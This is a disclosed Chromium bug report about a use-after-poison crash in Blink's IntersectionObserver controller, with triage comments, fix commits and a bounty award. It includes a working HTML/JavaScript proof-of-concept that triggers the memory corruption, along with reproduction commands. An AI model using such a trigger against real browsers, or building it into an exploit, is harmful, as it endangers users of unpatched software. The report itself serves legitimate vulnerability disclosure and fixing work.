# Sanitizer CHECK failure in "((*(u8*)MemToShadow(a))) == ((0))" (0x4, 0x0)

| Field | Value |
|-------|-------|
| **Issue ID** | [40050206](https://issues.chromium.org/issues/40050206) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Blink>Bindings, Blink>DOM, Blink>Geometry |
| **Platforms** | Android, Linux, Windows, ChromeOS |
| **Reporter** | jo...@microsoft.com |
| **Assignee** | sz...@chromium.org |
| **Created** | 2019-09-24 |
| **Bounty** | $2,000.00 |

## Description

POC:

<script>
function start() {
o107=document.createElementNS('http://www.w3.org/1999/xhtml','head');
o289=document.documentElement;
o410=new IntersectionObserver(()=>{}, {root: o107});
window.top.setTimeout(fun0,240);
o410.observe(o289);
}
function fun0() {
o684=(new DOMParser()).parseFromString(unescape('%3Chtml%20xmlns%3D%27http%3A//www.w3.org/1999/xhtml%27%3E%3Ctd%3E%3C/td%3E%3C/html%3E'),'text/html');
o687=o684.all[2];
o687.appendChild(o289);
o410 = null; o107=null; o289=null;
gc();
o721=o684.querySelector('\\*:not([id])');
o752=document.createElementNS('http://www.w3.org/2000/svg','feBlend');
o754=o752.prepend(o721);
}
</script>
<body onload="start()"></body>

**VERSION**  

Chrome Version: commit 70d1c6f5ae2ec9e9586c309be61856c6c36d4e0f  

Operating System: Windows 10 x64

**REPRODUCTION CASE**

.\chrome.exe --no-sandbox --js-flags=--expose-gc poc2.html

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: renderer  

Crash State:

=================================================================  

==3804==ERROR: AddressSanitizer: use-after-poison on address 0x7ef1fd8c5d30 at pc 0x7ff822bb5b70 bp 0x00f2471fd680 sp 0x00f2471fd6c8  

READ of size 8 at 0x7ef1fd8c5d30 thread T0  

==3804==\*\*\* WARNING: Failed to initialize DbgHelp! \*\*\*  

==3804==\*\*\* Most likely this means that the app is already \*\*\*  

==3804==\*\*\* using DbgHelp, possibly with incompatible flags. \*\*\*  

==3804==\*\*\* Due to technical reasons, symbolization might crash \*\*\*  

==3804==\*\*\* or produce wrong results. \*\*\*  

#0 0x7ff822bb5b6f in blink::IntersectionObserverController::RemoveTrackedElement F:\chromium\src\third\_party\blink\renderer\core\intersection\_observer\intersection\_observer\_controller.cc:101  

#1 0x7ff8201a35b0 in blink::Element::RemovedFrom F:\chromium\src\third\_party\blink\renderer\core\dom\element.cc:2662  

#2 0x7ff8224a5e54 in blink::HTMLElement::RemovedFrom F:\chromium\src\third\_party\blink\renderer\core\html\html\_element.cc:1148  

#3 0x7ff822402404 in blink::ContainerNode::NotifyNodeRemoved F:\chromium\src\third\_party\blink\renderer\core\dom\container\_node.cc:958  

#4 0x7ff8223fec9f in blink::ContainerNode::RemoveChild F:\chromium\src\third\_party\blink\renderer\core\dom\container\_node.cc:720  

#5 0x7ff8223fb849 in blink::CollectChildrenAndRemoveFromOldParent F:\chromium\src\third\_party\blink\renderer\core\dom\container\_node.cc:152  

#6 0x7ff8223fae21 in blink::ContainerNode::AppendChild F:\chromium\src\third\_party\blink\renderer\core\dom\container\_node.cc:846  

#7 0x7ff8223fa45d in blink::ContainerNode::InsertBefore F:\chromium\src\third\_party\blink\renderer\core\dom\container\_node.cc:388  

#8 0x7ff81fdecf15 in blink::V8Element::PrependMethodCallback F:\chromium\src\out\Asan\gen\third\_party\blink\renderer\bindings\core\v8\v8\_element.cc:4466  

#9 0x7ff8182cb7ec in v8::internal::FunctionCallbackArguments::Call F:\chromium\src\v8\src\api\api-arguments-inl.h:158  

#10 0x7ff8182c7e06 in v8::internal::`anonymous namespace'::HandleApiCallHelper<0> F:\chromium\src\v8\src\builtins\builtins-api.cc:111 #11 0x7ff8182c4fc8 in v8::internal::Builtin_Impl_HandleApiCall F:\chromium\src\v8\src\builtins\builtins-api.cc:141 #12 0x7ff8182c40a7 in v8::internal::Builtin_HandleApiCall F:\chromium\src\v8\src\builtins\builtins-api.cc:129 #13 0x7ff81abe2f3c in Builtins_CEntry_Return1_DontSaveFPRegs_ArgvOnStack_BuiltinExit+0x3c (F:\chromium\src\out\Asan\chrome_child.dll+0x182b12f3c) #14 0x7ff81ab6a7a8 in Builtins_InterpreterEntryTrampoline+0x2a8 (F:\chromium\src\out\Asan\chrome_child.dll+0x182a9a7a8) #15 0x7ff81ab67cbd in Builtins_JSEntryTrampoline+0x5d (F:\chromium\src\out\Asan\chrome_child.dll+0x182a97cbd) #16 0x7ff81ab678ab in Builtins_JSEntry+0xcb (F:\chromium\src\out\Asan\chrome_child.dll+0x182a978ab) #17 0x7ff81867dfc0 in v8::internal::`anonymous namespace'::Invoke F:\chromium\src\v8\src\execution\execution.cc:266  

#18 0x7ff81867cd75 in v8::internal::Execution::Call F:\chromium\src\v8\src\execution\execution.cc:358  

#19 0x7ff818161d8d in v8::Function::Call F:\chromium\src\v8\src\api\api.cc:4875  

#20 0x7ff81fd96999 in blink::V8ScriptRunner::CallFunction F:\chromium\src\third\_party\blink\renderer\bindings\core\v8\v8\_script\_runner.cc:472  

#21 0x7ff8225200b3 in blink::V8Function::Invoke F:\chromium\src\out\Asan\gen\third\_party\blink\renderer\bindings\core\v8\v8\_function.cc:107  

#22 0x7ff822520fbc in blink::V8Function::InvokeAndReportException F:\chromium\src\out\Asan\gen\third\_party\blink\renderer\bindings\core\v8\v8\_function.cc:251  

#23 0x7ff82596da8a in blink::ScheduledAction::Execute F:\chromium\src\third\_party\blink\renderer\bindings\core\v8\scheduled\_action.cc:171  

#24 0x7ff82596d67c in blink::ScheduledAction::Execute F:\chromium\src\third\_party\blink\renderer\bindings\core\v8\scheduled\_action.cc:151  

#25 0x7ff8259712ad in blink::DOMTimer::Fired F:\chromium\src\third\_party\blink\renderer\core\frame\dom\_timer.cc:162  

#26 0x7ff81fff380a in blink::TimerBase::RunInternal F:\chromium\src\third\_party\blink\renderer\platform\timer.cc:156  

#27 0x7ff81e9a6dda in base::TaskAnnotator::RunTask F:\chromium\src\base\task\common\task\_annotator.cc:142  

#28 0x7ff820cafe57 in base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::DoWorkImpl F:\chromium\src\base\task\sequence\_manager\thread\_controller\_with\_message\_pump\_impl.cc:365  

#29 0x7ff820caf0cc in base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::DoSomeWork F:\chromium\src\base\task\sequence\_manager\thread\_controller\_with\_message\_pump\_impl.cc:219  

#30 0x7ff820c7550f in base::MessagePumpDefault::Run F:\chromium\src\base\message\_loop\message\_pump\_default.cc:39  

#31 0x7ff820cb26b5 in base::sequence\_manager::internal::ThreadControllerWithMessagePumpImpl::Run F:\chromium\src\base\task\sequence\_manager\thread\_controller\_with\_message\_pump\_impl.cc:463  

#32 0x7ff81e949ab7 in base::RunLoop::Run F:\chromium\src\base\run\_loop.cc:156  

#33 0x7ff820ac533f in content::RendererMain F:\chromium\src\content\renderer\renderer\_main.cc:213  

#34 0x7ff81e6f806d in content::ContentMainRunnerImpl::Run F:\chromium\src\content\app\content\_main\_runner\_impl.cc:882  

#35 0x7ff81e85dacf in service\_manager::Main F:\chromium\src\services\service\_manager\embedder\main.cc:423  

#36 0x7ff81e6f5c05 in content::ContentMain F:\chromium\src\content\app\content\_main.cc:19  

#37 0x7ff8180d13ac in ChromeMain F:\chromium\src\chrome\app\chrome\_main.cc:110  

#38 0x7ff74e797bd3 in MainDllLoader::Launch F:\chromium\src\chrome\app\main\_dll\_loader\_win.cc:202  

#39 0x7ff74e792ccd in main F:\chromium\src\chrome\app\chrome\_exe\_main\_win.cc:234  

#40 0x7ff74ebaf94b in \_\_scrt\_common\_main\_seh d:\agent\_work\2\s\src\vctools\crt\vcstartup\src\startup\exe\_common.inl:288  

#41 0x7ff8d1f07bd3 in BaseThreadInitThunk+0x13 (C:\WINDOWS\System32\KERNEL32.DLL+0x180017bd3)  

#42 0x7ff8d35acee0 in RtlUserThreadStart+0x20 (C:\WINDOWS\SYSTEM32\ntdll.dll+0x18006cee0)

Address 0x7ef1fd8c5d30 is a wild pointer.  

SUMMARY: AddressSanitizer: use-after-poison F:\chromium\src\third\_party\blink\renderer\core\intersection\_observer\intersection\_observer\_controller.cc:101 in blink::IntersectionObserverController::RemoveTrackedElement  

Shadow bytes around the buggy address:  

0x126163418b50: f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7  

0x126163418b60: f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7  

0x126163418b70: f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7  

0x126163418b80: f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7  

0x126163418b90: f7 f7 f7 f7 06 00 00 00 00 00 00 00 00 00 00 00  

=>0x126163418ba0: 00 00 f7 f7 f7 f7[f7]f7 f7 f7 f7 f7 f7 f7 f7 f7  

0x126163418bb0: f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7  

0x126163418bc0: f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7  

0x126163418bd0: f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7  

0x126163418be0: f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7  

0x126163418bf0: f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7 f7  

Shadow byte legend (one shadow byte represents 8 application bytes):  

Addressable: 00  

Partially addressable: 01 02 03 04 05 06 07  

Heap left redzone: fa  

Freed heap region: fd  

Stack left redzone: f1  

Stack mid redzone: f2  

Stack right redzone: f3  

Stack after return: f5  

Stack use after scope: f8  

Global redzone: f9  

Global init order: f6  

Poisoned by user: f7  

Container overflow: fc  

Array cookie: ac  

Intra object redzone: bb  

ASan internal: fe  

Left alloca redzone: ca  

Right alloca redzone: cb  

Shadow gap: cc  

==3804==ABORTING

**Client ID (if relevant): [see link above]**

**CREDIT INFORMATION**  

Reporter credit: Johnathan Norman Microsoft Browser Vulnerability Research

## Attachments

- [poc2.html](attachments/poc2.html) (text/plain, 707 B)

## Timeline

### va...@chromium.org (2019-09-26)

[Empty comment from Monorail migration]

### cl...@chromium.org (2019-09-26)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5205906475057152.

### cl...@chromium.org (2019-09-26)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=6046101600600064.

### cl...@chromium.org (2019-09-26)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=4850638054621184.

### va...@chromium.org (2019-09-26)

[Empty comment from Monorail migration]

[Monorail components: Blink>Geometry]

### cl...@chromium.org (2019-09-26)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=4805512309637120.

### cl...@chromium.org (2019-09-26)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5413420739198976.

### cl...@chromium.org (2019-09-26)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://clusterfuzz.com/testcase?key=5444872784707584.

### cl...@chromium.org (2019-09-26)

[Empty comment from Monorail migration]

### cl...@chromium.org (2019-09-26)

This crash occurs very frequently on linux platform and is likely preventing the fuzzer  from making much progress. Fixing this will allow more bugs to be found.

Marking this bug as a blocker for next Beta release.

If this is incorrect, please add ClusterFuzz-Wrong label and remove the ReleaseBlock-Beta label.

### cl...@chromium.org (2019-09-26)

Testcase 4805512309637120 failed to reproduce the crash. Please inspect the program output at https://clusterfuzz.com/testcase?key=4805512309637120.

### cl...@chromium.org (2019-09-26)

Testcase 5413420739198976 failed to reproduce the crash. Please inspect the program output at https://clusterfuzz.com/testcase?key=5413420739198976.

### va...@chromium.org (2019-09-26)

8-byte-read-use-after-poison in renderer: Medium

### va...@chromium.org (2019-09-26)

Culprit CL seems to be https://chromium-review.googlesource.com/c/chromium/src/+/1774244, which is in Beta.

### sz...@chromium.org (2019-09-26)

Re #14: yes, I think that's right. I'm looking into it.

### cl...@chromium.org (2019-09-26)

Testcase 5444872784707584 failed to reproduce the crash. Please inspect the program output at https://clusterfuzz.com/testcase?key=5444872784707584.

### sz...@chromium.org (2019-09-27)

+vmpstr

### cl...@chromium.org (2019-09-27)

Automatically applying components based on crash stacktrace and information from OWNERS files.

If this is incorrect, please apply the Test-Predator-Wrong-Components label.

[Monorail components: Blink>DOM]

### cl...@chromium.org (2019-09-27)

Detailed Report: https://clusterfuzz.com/testcase?key=5205906475057152

Fuzzer: 
Job Type: linux_asan_chrome_mp
Platform Id: linux

Crash Type: Use-after-poison READ 8
Crash Address: 0x7ed54eea4d10
Crash State:
  blink::IntersectionObserverController::RemoveTrackedElement
  blink::Element::RemovedFrom
  blink::HTMLElement::RemovedFrom
  
Sanitizer: address (ASAN)

Recommended Security Severity: High

Regressed: https://clusterfuzz.com/revisions?job=linux_asan_chrome_mp&range=693525:693589

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=5205906475057152

Additional requirements: Requires HTTP

The reproduce tool requires a ClusterFuzz source checkout. To prepare one, run:

git clone https://github.com/google/clusterfuzz && cd clusterfuzz && git checkout tags/reproduce-tool-stable

To reproduce this issue, run:

./reproduce.sh -t https://clusterfuzz.com/testcase-detail/5205906475057152 -b /path/to/build

Please use the GN arguments provided in this report when building the binary. If you have any feedback on reproducing test cases, let us know at https://forms.gle/Yh3qCYFveHj6E5jz5 so we can improve.


The recommended severity (Security_Severity-High) is different from what was assigned to the bug. Please double check the accuracy of the assigned severity.

### sh...@chromium.org (2019-09-27)

Setting Pri-1 to match security severity Medium. If this is incorrect, please reset the priority. Sheriffbot won't make this change again.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### cl...@chromium.org (2019-09-27)

Detailed Report: https://clusterfuzz.com/testcase?key=4850638054621184

Fuzzer: 
Job Type: linux_asan_chrome_v8_arm
Platform Id: linux

Crash Type: Sanitizer CHECK failure
Crash Address: 
Crash State:
  "((*(u8*)MemToShadow(a))) == ((0))" (0x4, 0x0)
  
Sanitizer: address (ASAN)

Crash Revision: https://clusterfuzz.com/revisions?job=linux_asan_chrome_v8_arm&revision=700323

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=4850638054621184

Additional requirements: Requires HTTP

The reproduce tool requires a ClusterFuzz source checkout. To prepare one, run:

git clone https://github.com/google/clusterfuzz && cd clusterfuzz && git checkout tags/reproduce-tool-stable

To reproduce this issue, run:

./reproduce.sh -t https://clusterfuzz.com/testcase-detail/4850638054621184 -b /path/to/build

Please use the GN arguments provided in this report when building the binary. If you have any feedback on reproducing test cases, let us know at https://forms.gle/Yh3qCYFveHj6E5jz5 so we can improve.


### cl...@chromium.org (2019-09-27)

Detailed Report: https://clusterfuzz.com/testcase?key=6046101600600064

Fuzzer: 
Job Type: linux_asan_chrome_v8_arm
Platform Id: linux

Crash Type: Sanitizer CHECK failure
Crash Address: 
Crash State:
  "((*(u8*)MemToShadow(a))) == ((0))" (0x4, 0x0)
  
Sanitizer: address (ASAN)

Crash Revision: https://clusterfuzz.com/revisions?job=linux_asan_chrome_v8_arm&revision=700323

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=6046101600600064

Additional requirements: Requires HTTP

The reproduce tool requires a ClusterFuzz source checkout. To prepare one, run:

git clone https://github.com/google/clusterfuzz && cd clusterfuzz && git checkout tags/reproduce-tool-stable

To reproduce this issue, run:

./reproduce.sh -t https://clusterfuzz.com/testcase-detail/6046101600600064 -b /path/to/build

Please use the GN arguments provided in this report when building the binary. If you have any feedback on reproducing test cases, let us know at https://forms.gle/Yh3qCYFveHj6E5jz5 so we can improve.


### bu...@chops-service-accounts.iam.gserviceaccount.com (2019-09-27)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/c152a91fc0579557a474370783e64310427d4e2d

commit c152a91fc0579557a474370783e64310427d4e2d
Author: Stefan Zager <szager@chromium.org>
Date: Fri Sep 27 23:32:55 2019

[IntersectionObserver] Speculative fix for bad cast

These are instances where we don't actually need to remove an element from its
tracking document's IntersectionObserverController, because it wasn't being
tracked anyway.

BUG=1007334,1006957

Change-Id: Ia14165402e2a3774a180d0215145d3d46338942c
Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/1828358
Commit-Queue: Stefan Zager <szager@chromium.org>
Reviewed-by: vmpstr <vmpstr@chromium.org>
Cr-Commit-Position: refs/heads/master@{#700896}

[modify] https://crrev.com/c152a91fc0579557a474370783e64310427d4e2d/third_party/blink/renderer/core/dom/element.cc
[modify] https://crrev.com/c152a91fc0579557a474370783e64310427d4e2d/third_party/blink/renderer/core/intersection_observer/intersection_observation.cc
[modify] https://crrev.com/c152a91fc0579557a474370783e64310427d4e2d/third_party/blink/renderer/core/intersection_observer/intersection_observer.cc


### sz...@chromium.org (2019-09-28)

My patch would not have fixed this, but I think this patch might:

https://chromium-review.googlesource.com/c/chromium/src/+/1829097

### va...@chromium.org (2019-10-01)

Related: https://crbug.com/1008632

### cl...@chromium.org (2019-10-03)

[Empty comment from Monorail migration]

### ke...@chromium.org (2019-10-09)

Cluster-fuzz confirms that this is fixed as of r700700.

### sh...@chromium.org (2019-10-10)

[Empty comment from Monorail migration]

### na...@google.com (2019-10-14)

[Empty comment from Monorail migration]

### cl...@chromium.org (2019-10-16)

ClusterFuzz testcase 4850638054621184 is still reproducing on tip-of-tree build (trunk).

Please re-test your fix against this testcase and if the fix was incorrect or incomplete, please re-open the bug. Otherwise, ignore this notification and add the ClusterFuzz-Wrong label.

### jo...@microsoft.com (2019-10-24)

tested on commit 86fcad92d67e0401711080dd84cafb53790002d1 and I'm unable to reproduce the crash. tried a few times. Looks fixed to me. 

### cl...@chromium.org (2019-10-29)

Detailed Report: https://clusterfuzz.com/testcase?key=4850638054621184

Fuzzer: 
Job Type: linux_asan_chrome_v8_arm
Platform Id: linux

Crash Type: Sanitizer CHECK failure
Crash Address: 
Crash State:
  "((*(u8*)MemToShadow(a))) == ((0))" (0x4, 0x0)
  
Sanitizer: address (ASAN)

Crash Revision: https://clusterfuzz.com/revisions?job=linux_asan_chrome_v8_arm&revision=700323

Reproducer Testcase: https://clusterfuzz.com/download?testcase_id=4850638054621184

Additional requirements: Requires HTTP

The reproduce tool requires a ClusterFuzz source checkout. To prepare one, run:

git clone https://github.com/google/clusterfuzz && cd clusterfuzz && git checkout tags/reproduce-tool-stable

To reproduce this issue, run:

./reproduce.sh -t https://clusterfuzz.com/testcase-detail/4850638054621184 -b /path/to/build

Please use the GN arguments provided in this report when building the binary. If you have any feedback on reproducing test cases, let us know at https://forms.gle/Yh3qCYFveHj6E5jz5 so we can improve.


### na...@google.com (2019-11-21)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### na...@google.com (2019-11-21)

Congrats! The Panel decided to reward $2,000  for this report!

### na...@google.com (2019-11-21)

[Empty comment from Monorail migration]

### sh...@chromium.org (2020-01-17)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### na...@google.com (2020-02-20)

[Empty comment from Monorail migration]

### is...@google.com (2020-02-20)

This issue was migrated from crbug.com/chromium/1007334?no_tracker_redirect=1

[Auto-CCs applied]
[Multiple monorail components: Blink>Bindings, Blink>DOM, Blink>Geometry]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40050206)*
